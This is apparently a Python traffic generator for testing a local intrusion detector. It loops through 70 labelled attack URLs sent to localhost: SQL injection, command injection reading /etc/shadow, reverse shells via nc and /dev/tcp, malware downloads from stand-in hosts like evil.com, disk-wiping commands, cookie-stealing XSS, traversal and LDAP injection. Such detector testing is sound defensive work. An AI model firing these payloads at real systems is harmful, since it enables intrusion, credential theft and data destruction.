import requests
import time

# HIGH SEVERITY ATTACKS - Guaranteed to match your patterns
high_attacks = [
    # SQL Injection - UNION SELECT (10 attacks)
    "/?id=1' UNION SELECT password FROM users--",
    "/?id=2' UNION ALL SELECT username,password FROM accounts--",
    "/?id=3' UNION SELECT table_name FROM information_schema.tables--",
    "/?id=4' UNION SELECT column_name FROM information_schema.columns--",
    "/?id=5' UNION SELECT database(),user(),version()--",
    "/?id=6' UNION SELECT NULL,password FROM admin--",
    "/?id=7' UNION SELECT credit_card FROM payments--",
    "/?id=8' UNION SELECT * FROM users WHERE '1'='1",
    "/?id=9' UNION SELECT load_file('/etc/passwd')--",
    "/?id=10' UNION SELECT schema_name FROM information_schema.schemata--",
    
    # SQL Injection - Information Schema (5 attacks)
    "/?search=' UNION SELECT table_name FROM information_schema.tables--",
    "/?q=' AND 1=1 UNION SELECT column_name FROM information_schema.columns--",
    "/?user=' UNION SELECT table_schema FROM information_schema.tables--",
    "/?id=1' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables)))--",
    "/?login=' UNION SELECT constraint_name FROM information_schema.table_constraints--",
    
    # SQL Injection - Time-Based (5 attacks)
    "/?id=1' AND SLEEP(5)--",
    "/?id=2' AND SLEEP(3)--",
    "/?user=admin' WAITFOR DELAY '00:00:05'--",
    "/?id=3' AND BENCHMARK(5000000,MD5('test'))--",
    "/?search=test' AND pg_sleep(5)--",
    
    # Command Injection - /etc/shadow & /etc/passwd (10 attacks)
    "/?cmd=cat /etc/shadow",
    "/?exec=cat /etc/passwd",
    "/?system=cat /etc/shadow",
    "/?cmd=; cat /etc/shadow",
    "/?cmd=| cat /etc/passwd",
    "/?exec=`cat /etc/shadow`",
    "/?cmd=$(cat /etc/passwd)",
    "/?system=cat /etc/shadow; whoami",
    "/?cmd=cat /etc/passwd && ls",
    "/?exec=cat /etc/shadow | grep root",
    
    # Command Injection - Reverse Shell (5 attacks)
    "/?cmd=nc -e /bin/sh 10.0.0.1 4444",
    "/?exec=bash -i >& /dev/tcp/10.0.0.1/8080 0>&1",
    "/?system=/bin/bash -i",
    "/?cmd=/bin/sh -i",
    "/?exec=bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444'",
    
    # Command Injection - Malware Download (5 attacks)
    "/?cmd=wget http://evil.com/backdoor.sh",
    "/?exec=curl http://malicious.com/shell.php -o /tmp/shell.php",
    "/?system=wget http://attacker.com/malware.exe",
    "/?cmd=curl http://evil.com/rootkit -o /tmp/rootkit",
    "/?exec=wget http://hacker.com/exploit.sh -O /tmp/exploit.sh",
    
    # Remote Code Execution (5 attacks)
    "/?code=eval($_POST['cmd'])",
    "/?exec=system($_GET['command'])",
    "/?cmd=exec('whoami')",
    "/?system=shell_exec('cat /etc/passwd')",
    "/?code=passthru('ls -la')",
    
    # Command Injection - Destructive (5 attacks)
    "/?cmd=rm -rf /tmp",
    "/?exec=chmod 777 /etc/shadow",
    "/?system=dd if=/dev/zero of=/dev/sda",
    "/?cmd=mkfs.ext4 /dev/sda1",
    "/?exec=rm -rf /var/log/*",
]

# MEDIUM SEVERITY ATTACKS
medium_attacks = [
    # XSS - Script Tags (5 attacks)
    "/?search=<script>alert('XSS')</script>",
    "/?name=<script>alert(document.cookie)</script>",
    "/?q=<script>window.location='http://evil.com'</script>",
    "/?input=<script>fetch('http://attacker.com?c='+document.cookie)</script>",
    "/?comment=</script><script>alert('XSS')</script>",
    
    # XSS - Event Handlers (5 attacks)
    "/?search=<img src=x onerror=alert(1)>",
    "/?name=<body onload=alert(document.domain)>",
    "/?q=<div onclick=alert('XSS')>",
    "/?input=<svg onload=alert(1)>",
    "/?comment=<img src=x onmouseover=alert(document.cookie)>",
    
    # Directory Traversal (5 attacks)
    "/?file=../../etc/passwd",
    "/?path=../../../etc/hosts",
    "/?doc=../../../../var/log/auth.log",
    "/?file=..\\..\\..\\windows\\system32\\config\\sam",
    "/?path=..%2f..%2f..%2fetc%2fpasswd",
    
    # LDAP Injection (3 attacks)
    "/?user=*)(uid=*",
    "/?username=admin)(|(password=*))",
    "/?search=*)(objectClass=*",
    
    # File Inclusion (2 attacks)
    "/?page=../config.php",
    "/?include=../../database.sql",
]

all_attacks = high_attacks + medium_attacks

PORT = 8080  
print(f"🚨 Sending 70 attacks (50 HIGH + 20 MEDIUM) to localhost:{PORT}")
print(f"   - HIGH severity: {len(high_attacks)}")
print(f"   - MEDIUM severity: {len(medium_attacks)}")
print(f"   - Total: {len(all_attacks)}\n")

attack_count = 0

while True:
    for attack in all_attacks:
        attack_count += 1
        
        severity = "HIGH" if attack in high_attacks else "MEDIUM"
        
        url = f"http://localhost:{PORT}{attack}"
        try:
            requests.get(url, timeout=5)
            print(f"✓ [{severity:6s}] Attack #{attack_count:3d}: {attack[:60]}...")
        except Exception as e:
            print(f"✗ [{severity:6s}] Attack #{attack_count:3d}: Failed - {str(e)[:30]}")
        
        time.sleep(2)
    
    print(f"\n🔄 Completed 1 cycle of {len(all_attacks)} attacks. Looping again...\n")
